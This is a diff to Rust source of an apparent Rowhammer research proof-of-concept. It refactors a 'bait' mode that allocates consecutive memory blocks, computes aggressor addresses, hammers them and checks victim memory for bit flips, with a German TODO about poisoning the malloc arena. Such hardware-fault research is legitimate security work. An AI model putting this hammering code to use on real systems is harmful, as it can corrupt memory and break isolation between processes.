@@ -1,5 +1,4 @@
 use std::{
-    collections::{HashMap, HashSet},
     env,
     process::Command,
     ptr::null_mut,
@@ -17,7 +16,7 @@ use bs_poc::{
     memory::{
         ConsecAlloc, DRAMAddr, LinuxPageMap, MemBlock, PreAllocatedVictimMemory, VirtToPhysResolver,
     },
-    util::{BlacksmithConfig, MemConfiguration, MB, PAGE_SIZE},
+    util::{BlacksmithConfig, MemConfiguration, KNOWN_BITS, PAGE_SIZE},
     victim::HammerVictimMemCheck,
 };
 use clap::Parser;
@@ -124,31 +123,6 @@ unsafe fn mode_bait(args: CliArgs) -> anyhow::Result<()> {
         );
     }
 
-    // find mapping classes
-    let addrs = mapping
-        .aggressor_to_addr
-        .iter()
-        .map(|(_, addr)| addr)
-        .collect::<HashSet<_>>();
-
-    let mut sets: HashMap<usize, Vec<DRAMAddr>> = HashMap::new();
-
-    for addr in addrs {
-        let virt = addr.to_virt(BASE_MSB as *const u8, mem_config) as usize;
-        let virt = virt >> 22;
-        //info!("{:?}, {:?}", virt, addr);
-        let entry = sets.entry(virt).or_insert(Vec::new());
-        entry.push(addr.clone());
-    }
-
-    let num_sets = sets.len();
-
-    info!("Mapping consists of {} sets", num_sets);
-
-    /*for k in sets.keys().sorted() {
-        info!("{}: {:?}", k, sets[k]);
-    }*/
-
     let mapping_min = DRAMAddr::new(mapping.bank_no, mapping.min_row, 0);
     let mapping_max = DRAMAddr::new(mapping.bank_no, mapping.max_row, 0);
     info!(
@@ -168,59 +142,45 @@ unsafe fn mode_bait(args: CliArgs) -> anyhow::Result<()> {
     //let mut set_iter = sets.iter();
     //let mut cur = set_iter.next();
     //while let Some((base, _)) = cur {
-    loop {
-        let size = 4 * MB;
-        let blocks = (0..num_sets)
-            .map(|_| MemBlock::alloc_consec_block(size))
-            .collect::<Result<Vec<_>, _>>()?;
+    let size = 1 << KNOWN_BITS;
 
-        // We have successfully allocated consecutive blocks of `size` bytes.
-        info!(
-            "Successfully allocated {} {} byte blocks.",
-            blocks.len(),
-            size
-        );
+    let mut blocks = vec![];
+    let hammering_addrs = mapping.get_hammering_addresses_relocate(
+        &pattern.access_ids,
+        mem_config,
+        KNOWN_BITS,
+        |num_blocks| {
+            blocks = (0..num_blocks)
+                .map(|_| MemBlock::alloc_consec_block(size))
+                .collect::<anyhow::Result<Vec<_>>>()?;
+            Ok(blocks.clone())
+        },
+    );
 
-        info!("Allocated blocks:");
-        for block in &blocks {
-            info!(
-                "[{:?}, {:?})",
-                block.ptr as AggressorPtr,
-                block.ptr.add(block.len) as AggressorPtr
-            );
-        }
+    let hammering_addrs = hammering_addrs?;
 
-        let bases = blocks
-            .iter()
-            .map(|block| block.ptr as AggressorPtr)
-            .collect::<Vec<_>>();
+    let hammerer = Hammerer::new(
+        mem_config,
+        pattern.clone(),
+        mapping.clone(),
+        &hammering_addrs,
+        blocks.clone(),
+    )?;
+    let memory = PreAllocatedVictimMemory::new(blocks)?;
+    let mut victim = HammerVictimMemCheck::new(mem_config.clone(), &memory);
 
-        let hammering_addrs =
-            mapping.get_hammering_addresses_relocate(&pattern.access_ids, &bases, mem_config)?;
+    let res = hammerer.hammer(&mut victim);
+    print!("{:?}", res);
 
-        let hammerer = Hammerer::new(
-            mem_config,
-            pattern.clone(),
-            mapping.clone(),
-            &hammering_addrs,
-            bases,
-        )?;
-        let memory = PreAllocatedVictimMemory::new(blocks)?;
-        let mut victim = HammerVictimMemCheck::new(mem_config.clone(), &memory);
+    // signal child process
+    //signal("INT", child.id())?;
+    //let _output = child.wait_with_output().expect("child wait");
+    //thread::sleep(std::time::Duration::from_secs(2));
 
-        let res = hammerer.hammer(&mut victim);
-        print!("{:?}", res);
-
-        // signal child process
-        //signal("INT", child.id())?;
-        //let _output = child.wait_with_output().expect("child wait");
-        //thread::sleep(std::time::Duration::from_secs(2));
-
-        // cleanup
-        //libc::munmap(v as *mut c_void, 2 * MB);
-        // TODO munmap all allocation
-        return Ok(());
-    }
+    // cleanup
+    //libc::munmap(v as *mut c_void, 2 * MB);
+    // TODO munmap all allocation
+    return Ok(());
 }
 
 // TODO entweder malloc arena vergiften oder viel speicher alloziieren und wenig freigeben
